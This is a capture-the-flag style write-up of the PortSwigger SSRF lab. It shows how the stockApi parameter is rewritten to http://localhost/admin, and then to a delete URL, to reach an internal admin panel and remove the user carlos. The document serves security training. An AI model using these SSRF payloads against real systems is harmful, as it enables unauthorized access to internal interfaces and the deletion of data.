# PortSwigger Lab: Basic SSRF Against the Local Server

## Objective

Exploit the SSRF vulnerability in the stock check feature to access the internal administration interface and delete the user `carlos`.

---

## Vulnerability

The application uses the `stockApi` parameter to fetch stock information from a backend system. Since the URL is user-controllable, it is possible to force the server to make requests to internal resources.

---

## Steps

### 1. Verify Direct Access Restriction

Attempt to browse to:

```text
/admin
```

The admin panel is inaccessible from the browser.

---

### 2. Intercept the Stock Check Request

Open a product page and click **Check Stock**.

Capture the request in Burp Suite and send it to Repeater.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

---

### 3. Access the Internal Admin Interface

Modify the `stockApi` parameter:

```http
stockApi=http://localhost/admin
```

Send the request.

The response contains the HTML for the administration interface.

---

### 4. Identify the Delete Endpoint

Inspect the response and locate the link used to delete the target user:

```text
http://localhost/admin/delete?username=carlos
```

---

### 5. Delete the User

Replace the parameter value with:

```http
stockApi=http://localhost/admin/delete?username=carlos
```

Send the request.

The server performs the request internally and deletes the user `carlos`, solving the lab.

---

## Explanation

The application trusted user-controlled input and used it to make backend HTTP requests. By changing the destination to `localhost`, the server was tricked into accessing its own internal administration interface. Since requests originating from the local machine are trusted, the access controls protecting `/admin` were bypassed.

---

## Payloads Used

Access admin panel:

```text
http://localhost/admin
```

Delete target user:

```text
http://localhost/admin/delete?username=carlos
```

---
